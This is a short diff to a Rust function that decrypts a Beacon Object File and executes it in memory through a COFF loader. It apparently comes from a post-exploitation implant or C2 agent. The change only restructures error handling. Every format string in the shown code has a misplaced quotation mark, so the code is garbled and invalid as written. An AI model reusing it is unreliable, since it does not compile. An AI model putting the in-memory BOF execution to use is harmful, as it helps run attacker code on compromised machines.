@@ -36,12 +36,13 @@ pub(crate) fn inline_execute(args: &[String], client: &Client) -> String {
         Err(_e) => return format!("Failed to decrypt BOF: "{_e}),
     };
 
-    match coff_loader::Coffee::new(&bof).unwrap().execute(
-        Some(args.as_ptr()),
-        Some(args.len()),
-        &Some(entrypoint),
-    ) {
-        Ok(result) => format!("BOF file executed! Output:\n"{result}),
-        Err(_e) => format!("Failed to execute BOF: "{_e}),
+    match coff_loader::Coffee::new(&bof) {
+        Ok(mut coffee) => {
+            match coffee.execute(Some(args.as_ptr()), Some(args.len()), &Some(entrypoint)) {
+                Ok(result) => format!("BOF file executed! Output:\n"{result}),
+                Err(_e) => format!("Failed to execute BOF: "{_e}),
+            }
+        }
+        Err(_e) => format!("Failed to create Coffee instance: "{_e}),
     }
 }
